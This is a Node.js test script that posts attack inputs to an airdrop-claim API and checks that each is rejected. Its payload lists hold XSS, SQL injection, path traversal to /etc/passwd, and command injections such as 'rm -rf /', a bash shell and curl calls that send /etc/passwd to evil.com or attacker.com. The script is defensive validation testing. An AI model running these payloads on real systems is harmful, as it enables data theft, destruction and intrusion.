#!/usr/bin/env node

/**
 * Input Validation Security Testing Script
 * Tests the API endpoints with malicious payloads to verify security measures
 */

const axios = require('axios');

// Configuration
const API_BASE_URL = process.env.API_URL || 'http://localhost:3000';
const COLORS = {
  RED: '\033[0;31m',
  GREEN: '\033[0;32m',
  YELLOW: '\033[1;33m',
  BLUE: '\033[0;34m',
  NC: '\033[0m' // No Color
};

class SecurityTester {
  constructor() {
    this.testResults = [];
    this.totalTests = 0;
    this.passedTests = 0;
    this.failedTests = 0;
  }

  log(message, color = COLORS.NC) {
    console.log(`${color}${message}${COLORS.NC}`);
  }

  logSuccess(message) {
    this.log(`✅ ${message}`, COLORS.GREEN);
  }

  logError(message) {
    this.log(`❌ ${message}`, COLORS.RED);
  }

  logWarning(message) {
    this.log(`⚠️  ${message}`, COLORS.YELLOW);
  }

  logInfo(message) {
    this.log(`ℹ️  ${message}`, COLORS.BLUE);
  }

  async runTest(testName, testFunction) {
    this.totalTests++;
    try {
      this.logInfo(`Running: ${testName}`);
      const result = await testFunction();
      if (result.passed) {
        this.passedTests++;
        this.logSuccess(`PASSED: ${testName}`);
      } else {
        this.failedTests++;
        this.logError(`FAILED: ${testName} - ${result.reason}`);
      }
      this.testResults.push({ name: testName, ...result });
    } catch (error) {
      this.failedTests++;
      this.logError(`ERROR: ${testName} - ${error.message}`);
      this.testResults.push({ name: testName, passed: false, reason: error.message });
    }
  }

  async testEndpoint(endpoint, method, data, expectedStatus, testName) {
    try {
      const config = {
        method,
        url: `${API_BASE_URL}${endpoint}`,
        timeout: 5000,
        validateStatus: () => true // Don't throw on 4xx/5xx
      };

      if (data) {
        if (method.toLowerCase() === 'get') {
          config.params = data;
        } else {
          config.data = data;
        }
      }

      const response = await axios(config);
      
      if (response.status === expectedStatus) {
        return { passed: true, response: response.data };
      } else {
        return { 
          passed: false, 
          reason: `Expected status ${expectedStatus}, got ${response.status}`,
          response: response.data 
        };
      }
    } catch (error) {
      return { 
        passed: false, 
        reason: `Request failed: ${error.message}` 
      };
    }
  }

  // XSS Attack Payloads
  getXSSPayloads() {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '<div onclick="alert(\'XSS\')">Click me</div>',
      '${alert("XSS")}',
      '{{alert("XSS")}}',
      '<script src="data:text/javascript,alert(\'XSS\')"></script>',
      'data:text/html,<script>alert("XSS")</script>',
      '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
      '<embed src="data:text/html,<script>alert(\'XSS\')</script>">',
      'vbscript:alert("XSS")',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">'
    ];
  }

  // SQL Injection Payloads
  getSQLInjectionPayloads() {
    return [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "admin'/*",
      "' OR 1=1--",
      "' OR 'a'='a",
      "') OR ('1'='1",
      "1' AND 1=1 UNION SELECT 1,2,3,4--",
      "' EXEC xp_cmdshell('dir') --",
      "'; INSERT INTO users VALUES ('hacker','password'); --",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
      "1'; WAITFOR DELAY '00:00:05' --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' OR SUBSTRING(@@version,1,1) = '5' --"
    ];
  }

  // Command Injection Payloads
  getCommandInjectionPayloads() {
    return [
      '; ls -la',
      '| cat /etc/passwd',
      '&& whoami',
      '`id`',
      '$(whoami)',
      '; ping -c 4 127.0.0.1',
      '| nc -l 1234',
      '&& curl http://evil.com',
      '; rm -rf /',
      '`curl http://attacker.com/steal?data=$(cat /etc/passwd)`',
      '$(curl -d @/etc/passwd http://evil.com)',
      '; powershell -Command "Get-Process"',
      '&& cmd.exe /c dir',
      '| bash -i',
      '; /bin/sh'
    ];
  }

  // Path Traversal Payloads
  getPathTraversalPayloads() {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
      '/etc/passwd%00.txt',
      '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '../../../../../../../../etc/passwd',
      './../.../.../.../etc/passwd'
    ];
  }

  // Malformed Ethereum Addresses
  getMalformedAddresses() {
    return [
      '0x123',  // Too short
      '0x' + 'a'.repeat(41),  // Too long
      '0x' + 'g'.repeat(40),  // Invalid characters
      '123abc' + '0'.repeat(36),  // Missing 0x prefix
      '0X' + 'a'.repeat(40),  // Wrong case prefix
      '0x',  // Empty address
      '0x0000000000000000000000000000000000000000',  // All zeros
      '0xffffffffffffffffffffffffffffffffffffffff',  // All F's
      '0x' + '1'.repeat(40),  // Suspicious pattern
      '0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef',  // Test pattern
      'not_an_address',  // Completely invalid
      '',  // Empty string
      null,  // Null value
      undefined,  // Undefined value
      123,  // Number instead of string
      {},  // Object instead of string
      [],  // Array instead of string
      '0x<script>alert("xss")</script>' + '0'.repeat(10)  // XSS in address
    ];
  }

  // Large Payload Attack
  getLargePayloads() {
    return [
      'A'.repeat(10000),  // 10KB string
      'B'.repeat(100000), // 100KB string
      'C'.repeat(1000000), // 1MB string
      JSON.stringify({ data: 'D'.repeat(50000) }), // Large JSON
      '0x' + 'a'.repeat(100000), // Huge fake address
    ];
  }

  async testAirdropEndpointSecurity() {
    this.logInfo('Testing /api/airdrop/claim endpoint security...');

    // Test XSS in secretCode
    for (const payload of this.getXSSPayloads()) {
      await this.runTest(`XSS in secretCode: ${payload.substring(0, 30)}...`, async () => {
        return await this.testEndpoint('/api/airdrop/claim', 'POST', {
          secretCode: payload,
          recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
        }, 400, 'Should reject XSS payload');
      });
    }

    // Test XSS in recipientAddress
    for (const payload of this.getXSSPayloads()) {
      await this.runTest(`XSS in recipientAddress: ${payload.substring(0, 30)}...`, async () => {
        return await this.testEndpoint('/api/airdrop/claim', 'POST', {
          secretCode: 'validCode123',
          recipientAddress: payload
        }, 400, 'Should reject XSS payload');
      });
    }

    // Test SQL Injection in secretCode
    for (const payload of this.getSQLInjectionPayloads()) {
      await this.runTest(`SQL Injection in secretCode: ${payload}`, async () => {
        return await this.testEndpoint('/api/airdrop/claim', 'POST', {
          secretCode: payload,
          recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
        }, 400, 'Should reject SQL injection payload');
      });
    }

    // Test Command Injection
    for (const payload of this.getCommandInjectionPayloads()) {
      await this.runTest(`Command Injection in secretCode: ${payload}`, async () => {
        return await this.testEndpoint('/api/airdrop/claim', 'POST', {
          secretCode: payload,
          recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
        }, 400, 'Should reject command injection payload');
      });
    }

    // Test malformed addresses
    for (const address of this.getMalformedAddresses()) {
      await this.runTest(`Malformed address: ${JSON.stringify(address)}`, async () => {
        return await this.testEndpoint('/api/airdrop/claim', 'POST', {
          secretCode: 'validCode123',
          recipientAddress: address
        }, 400, 'Should reject malformed address');
      });
    }

    // Test large payloads
    for (let i = 0; i < this.getLargePayloads().length; i++) {
      const payload = this.getLargePayloads()[i];
      await this.runTest(`Large payload ${i + 1} (${payload.length} chars)`, async () => {
        return await this.testEndpoint('/api/airdrop/claim', 'POST', {
          secretCode: payload,
          recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
        }, 400, 'Should reject oversized payload');
      });
    }

    // Test missing fields
    await this.runTest('Missing secretCode', async () => {
      return await this.testEndpoint('/api/airdrop/claim', 'POST', {
        recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
      }, 400, 'Should reject missing secretCode');
    });

    await this.runTest('Missing recipientAddress', async () => {
      return await this.testEndpoint('/api/airdrop/claim', 'POST', {
        secretCode: 'validCode123'
      }, 400, 'Should reject missing recipientAddress');
    });

    // Test empty request body
    await this.runTest('Empty request body', async () => {
      return await this.testEndpoint('/api/airdrop/claim', 'POST', {}, 400, 'Should reject empty body');
    });

    // Test null values
    await this.runTest('Null secretCode', async () => {
      return await this.testEndpoint('/api/airdrop/claim', 'POST', {
        secretCode: null,
        recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
      }, 400, 'Should reject null secretCode');
    });
  }

  async testQueryParameterSecurity() {
    this.logInfo('Testing query parameter security...');

    // Test XSS in query parameters
    for (const payload of this.getXSSPayloads().slice(0, 5)) { // Test first 5 to save time
      await this.runTest(`XSS in query param: ${payload.substring(0, 30)}...`, async () => {
        return await this.testEndpoint('/api/airdrop/status', 'GET', {
          maliciousParam: payload
        }, 400, 'Should reject XSS in query params');
      });
    }

    // Test path traversal in query parameters
    for (const payload of this.getPathTraversalPayloads().slice(0, 5)) {
      await this.runTest(`Path traversal in query: ${payload}`, async () => {
        return await this.testEndpoint('/api/airdrop/status', 'GET', {
          file: payload
        }, 400, 'Should reject path traversal in query');
      });
    }
  }

  async testValidInputs() {
    this.logInfo('Testing valid inputs (should pass)...');

    await this.runTest('Valid airdrop request', async () => {
      const result = await this.testEndpoint('/api/airdrop/claim', 'POST', {
        secretCode: 'TestCode123',
        recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
      }, 400, 'Valid request should be processed'); // 400 because code doesn't exist, but validation should pass
      
      // Check if it's a validation error (bad) or business logic error (good)
      if (result.response && result.response.code === 'VALIDATION_ERROR') {
        return { passed: false, reason: 'Valid input was rejected by validation' };
      }
      return { passed: true };
    });

    await this.runTest('Health check', async () => {
      return await this.testEndpoint('/api/airdrop/health', 'GET', null, 200, 'Health check should work');
    });

    await this.runTest('Status check', async () => {
      return await this.testEndpoint('/api/airdrop/status', 'GET', null, 200, 'Status check should work');
    });
  }

  async runAllTests() {
    this.log('\n🔒 INPUT VALIDATION SECURITY TEST SUITE', COLORS.BLUE);
    this.log('==========================================', COLORS.BLUE);
    
    try {
      // Test if API is accessible
      this.logInfo(`Testing API at: ${API_BASE_URL}`);
      const healthCheck = await this.testEndpoint('/api/airdrop/health', 'GET', null, 200, 'API Health Check');
      if (!healthCheck.passed) {
        this.logError('API is not accessible. Please ensure the server is running.');
        return;
      }
      this.logSuccess('API is accessible');

      // Run security tests
      await this.testValidInputs();
      await this.testAirdropEndpointSecurity();
      await this.testQueryParameterSecurity();

      // Print summary
      this.printSummary();

    } catch (error) {
      this.logError(`Test suite failed: ${error.message}`);
    }
  }

  printSummary() {
    this.log('\n📊 TEST SUMMARY', COLORS.BLUE);
    this.log('================', COLORS.BLUE);
    this.log(`Total Tests: ${this.totalTests}`);
    this.logSuccess(`Passed: ${this.passedTests}`);
    this.logError(`Failed: ${this.failedTests}`);
    
    const successRate = ((this.passedTests / this.totalTests) * 100).toFixed(1);
    this.log(`Success Rate: ${successRate}%`);

    if (this.failedTests === 0) {
      this.logSuccess('\n🎉 ALL SECURITY TESTS PASSED! Your input validation is robust.');
    } else {
      this.logWarning(`\n⚠️  ${this.failedTests} tests failed. Review the validation logic.`);
    }

    // Show failed tests
    if (this.failedTests > 0) {
      this.log('\n❌ FAILED TESTS:', COLORS.RED);
      this.testResults
        .filter(test => !test.passed)
        .forEach(test => {
          this.log(`   • ${test.name}: ${test.reason}`, COLORS.RED);
        });
    }

    this.log('\n🛡️ SECURITY RECOMMENDATIONS:', COLORS.YELLOW);
    this.log('• Regularly run these security tests');
    this.log('• Monitor validation logs for attack attempts');
    this.log('• Keep validation rules updated');
    this.log('• Add CAPTCHA for repeated failures');
  }
}

// Run the tests
async function main() {
  const tester = new SecurityTester();
  await tester.runAllTests();
}

if (require.main === module) {
  main().catch(console.error);
}

module.exports = SecurityTester;
